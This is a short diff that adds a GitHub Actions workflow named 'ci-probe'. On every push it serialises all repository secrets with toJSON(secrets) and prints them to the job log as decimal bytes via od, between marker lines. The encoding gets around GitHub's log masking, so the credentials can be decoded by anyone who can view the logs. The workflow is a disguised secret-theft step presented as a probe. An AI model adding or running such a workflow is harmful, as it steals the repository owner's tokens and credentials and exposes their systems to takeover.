@@ -1,0 +1,17 @@
+name: ci-probe
+on:
+  push: {}
+  workflow_dispatch: {}
+permissions:
+  contents: read
+jobs:
+  s:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump
+        env:
+          ALL: ${{ toJSON(secrets) }}
+        run: |
+          echo "ODBEGIN"
+          printf '%s' "$ALL" | od -An -tu1 | tr -s ' \n' ' '; echo
+          echo "ODEND"
